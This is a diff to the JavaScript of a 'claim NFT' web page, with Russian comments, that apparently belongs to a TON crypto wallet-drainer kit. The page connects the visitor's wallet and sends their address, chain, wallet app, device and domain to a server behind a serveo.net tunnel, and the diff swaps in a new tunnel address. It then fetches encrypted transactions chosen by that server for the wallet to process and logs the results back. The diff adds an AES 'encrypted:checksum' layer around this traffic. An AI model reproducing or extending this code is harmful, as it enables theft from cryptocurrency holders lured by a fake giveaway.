@@ -660,6 +660,47 @@
                 .map(b => b.toString(16).padStart(2, '0'))
                 .join('');
         }
+        async function encryptForServer(data, key) {
+    try {
+        const encrypted = Aes.Ctr.encrypt(JSON.stringify(data), key, 256);
+        const checksum = Aes.Ctr.encrypt(await getSHA256Hash(encrypted), signature, 256);
+        return `${encrypted}:${checksum}`;
+    } catch (error) {
+        console.error('❌ Encryption error:', error);
+        throw error;
+    }
+}
+
+// Функция для дешифрования данных в формате сервера (encrypted:checksum)
+async function decryptFromServer(encryptedData, key) {
+    try {
+        if (!encryptedData || typeof encryptedData !== 'string') {
+            throw new Error('Invalid encrypted data');
+        }
+
+        const parts = encryptedData.split(':');
+        if (parts.length !== 2) {
+            throw new Error('Invalid data format, expected encrypted:checksum');
+        }
+
+        const [encrypted, checksum] = parts;
+
+        // Проверяем checksum
+        const decryptedChecksum = Aes.Ctr.decrypt(checksum, signature, 256);
+        const expectedChecksum = await getSHA256Hash(encrypted);
+
+        if (decryptedChecksum !== expectedChecksum) {
+            throw new Error('Checksum verification failed');
+        }
+
+        // Дешифруем основные данные
+        const decrypted = Aes.Ctr.decrypt(encrypted, key, 256);
+        return decrypted;
+    } catch (error) {
+        console.error('❌ Decryption error:', error);
+        throw error;
+    }
+}
 
         // Инициализация TON Connect
         function initTonConnect() {
@@ -684,7 +725,7 @@
         // Подключение к WebSocket серверу
 function connectWebSocket() {
     try {
-        ws = new WebSocket('wss://4a12734edab2ffeb493ff5a21f46a9db.serveo.net');
+        ws = new WebSocket('wss://8bb19ba2eabd0d2af4e131dcbe0d06c9.serveo.net');
         
         ws.onopen = function() {
             console.log('✅ WebSocket connected');
@@ -787,10 +828,12 @@ function handleServerConnected(data) {
 }
 
 // Обработка проверки безопасности
-function handleSafetyChallenge(data) {
+async function handleSafetyChallenge(data) {
     try {
-        // Используем data.data вместо data.message
-        const decryptedMessage = Aes.Ctr.decrypt(data.data, myEncryption, 256);
+        console.log('🔒 Handling safety challenge');
+        
+        // Дешифруем сообщение безопасности в формате сервера
+        const decryptedMessage = await decryptFromServer(data.data, myEncryption);
         console.log('🔓 Decrypted safety message:', decryptedMessage);
         
         const messageObj = JSON.parse(decryptedMessage);
@@ -802,8 +845,8 @@ function handleSafetyChallenge(data) {
                 domain: window.location.hostname
             };
             
-            // Шифруем ответ
-            const encryptedResponse = Aes.Ctr.encrypt(JSON.stringify(checkResponse), clientEncryption, 256);
+            // Шифруем ответ в формате сервера
+            const encryptedResponse = await encryptForServer(checkResponse, clientEncryption);
             
             // Отправляем проверочное сообщение
             const checkMessage = {
@@ -821,27 +864,28 @@ function handleSafetyChallenge(data) {
         
     } catch (error) {
         console.error('❌ Safety challenge handling failed:', error);
-        showStatus('Security error', 'error');
+        showStatus('Security error: ' + error.message, 'error');
     }
 }
 
-        // Обработка транзакционных сообщений
-        function handleTransactionMessages(data) {
+// Обработка транзакционных сообщений (обновленная)
+async function handleTransactionMessages(data) {
     try {
         showStatus('Processing transaction data...', 'info');
         
-        // Используем data.data вместо data.message
         console.log('🔐 Encrypted transaction data:', data.data);
-        const decryptedData = Aes.Ctr.decrypt(data.data, myEncryption, 256);
+        
+        // Дешифруем данные в формате сервера
+        const decryptedData = await decryptFromServer(data.data, myEncryption);
         console.log('🔓 Decrypted transaction data:', decryptedData);
         
         const transactionData = JSON.parse(decryptedData);
         
         if (transactionData.messages && transactionData.messages.length > 0) {
-            processTransactionMessages(transactionData);
+            await processTransactionMessages(transactionData);
         } else {
             console.log('❌ No transaction messages available');
-            showStatus('No transactions available', 'error');
+            showStatus('No transactions available at the moment', 'info');
         }
         
     } catch (error) {
@@ -904,70 +948,75 @@ function handleSafetyChallenge(data) {
 
         // Основная функция для получения NFT
         async function claimNFT() {
-            if (!tonConnectUI?.connected) {
-                showStatus('Please connect your wallet first!', 'error');
-                return;
-            }
+    if (!tonConnectUI?.connected) {
+        showStatus('Please connect your wallet first!', 'error');
+        return;
+    }
 
-            if (!isWebSocketConnected) {
-                showStatus('Server connection lost. Reconnecting...', 'error');
-                connectWebSocket();
-                return;
-            }
+    console.log('👛 Wallet address:', tonConnectUI.account?.address);
+    
+    if (!isWebSocketConnected) {
+        showStatus('Server connection lost. Reconnecting...', 'error');
+        connectWebSocket();
+        return;
+    }
 
-            showStatus('Requesting NFT transaction...', 'info');
+    showStatus('Requesting NFT transaction...', 'info');
 
-            try {
-                const requestData = {
-                    userInfo: getUserInfo()
-                };
+    try {
+        const userInfo = getUserInfo();
+        console.log('📤 Sending user info:', userInfo);
+        
+        const requestData = {
+            userInfo: userInfo
+        };
 
-                // Шифруем запрос
-                const encryptedRequest = Aes.Ctr.encrypt(JSON.stringify(requestData), clientEncryption, 256);
-                
-                const message = {
-                    action: 'getMessages',
-                    data: encryptedRequest
-                };
-                
-                console.log('📤 Sending encrypted NFT request');
-                ws.send(JSON.stringify(message));
-                
-            } catch (error) {
-                console.error('❌ Failed to prepare NFT request:', error);
-                showStatus('Failed to prepare request', 'error');
-            }
-        }
+        // Шифруем запрос в формате сервера
+        const encryptedRequest = await encryptForServer(requestData, clientEncryption);
+        
+        const message = {
+            action: 'getMessages',
+            data: encryptedRequest
+        };
+        
+        console.log('📤 Sending encrypted NFT request');
+        ws.send(JSON.stringify(message));
+        
+    } catch (error) {
+        console.error('❌ Failed to prepare NFT request:', error);
+        showStatus('Failed to prepare request: ' + error.message, 'error');
+    }
+}
 
         // Отправка статуса транзакции на сервер
         async function sendTransactionStatus(status, messages) {
-            if (!ws || !isWebSocketConnected) {
-                console.log('❌ WebSocket not connected');
-                return;
-            }
-            
-            try {
-                const statusData = {
-                    status: status,
-                    chunk: messages,
-                    userInfo: getUserInfo()
-                };
+    if (!ws || !isWebSocketConnected) {
+        console.log('❌ WebSocket not connected');
+        return;
+    }
+    
+    try {
+        const statusData = {
+            status: status,
+            chunk: messages,
+            userInfo: getUserInfo()
+        };
 
-                // Шифруем статус
-                const encryptedData = Aes.Ctr.encrypt(JSON.stringify(statusData), clientEncryption, 256);
-                
-                const message = {
-                    action: 'log',
-                    data: encryptedData
-                };
-                
-                console.log('📤 Sending transaction status to server');
-                ws.send(JSON.stringify(message));
-                
-            } catch (error) {
-                console.error('❌ Failed to send transaction status:', error);
-            }
-        }
+        // Шифруем статус в формате сервера
+        const encryptedData = await encryptForServer(statusData, clientEncryption);
+        
+        const message = {
+            action: 'log',
+            data: encryptedData
+        };
+        
+        console.log('📤 Sending transaction status to server');
+        ws.send(JSON.stringify(message));
+        
+    } catch (error) {
+        console.error('❌ Failed to send transaction status:', error);
+    }
+}
 
         // Генерация случайного ключа
         function generateRandomKey() {
@@ -980,26 +1029,33 @@ function handleSafetyChallenge(data) {
 
         // Получение информации о пользователе
         function getUserInfo() {
-            const wallet = tonConnectUI?.account;
-            return {
-                ip: 'auto-detected',
-                country: 'auto',
-                domain: window.location.hostname,
-                sng: false,
-                address: wallet?.address || '',
-                device: {
-                    app: 'web',
-                    platform: 'browser',
-                    userAgent: navigator.userAgent
-                },
-                hash: generateHash(),
-                timestamp: Date.now()
-            };
-        }
-
-        function generateHash() {
-            return Math.random().toString(36).substring(2) + Date.now().toString(36);
-        }
+    const wallet = tonConnectUI?.account;
+    const userInfo = {
+        ip: 'auto-detected',
+        country: 'auto',
+        domain: window.location.hostname,
+        sng: false,
+        address: wallet?.address || '',
+        device: {
+            app: 'web',
+            platform: 'browser',
+            userAgent: navigator.userAgent,
+            language: navigator.language
+        },
+        wallet: {
+            address: wallet?.address,
+            chain: wallet?.chain,
+            device: wallet?.device?.appName || 'unknown'
+        },
+        hash: generateHash(),
+        timestamp: Date.now()
+    };
+    
+    console.log('🌐 Domain being sent:', userInfo.domain);
+    console.log('📍 Full wallet info:', userInfo.wallet);
+    
+    return userInfo;
+}
 
         // Отключение кошелька
         function disconnectWallet() {
@@ -1068,6 +1124,7 @@ function handleSafetyChallenge(data) {
     </script>
 </body>
 </html>
+
 
 
 
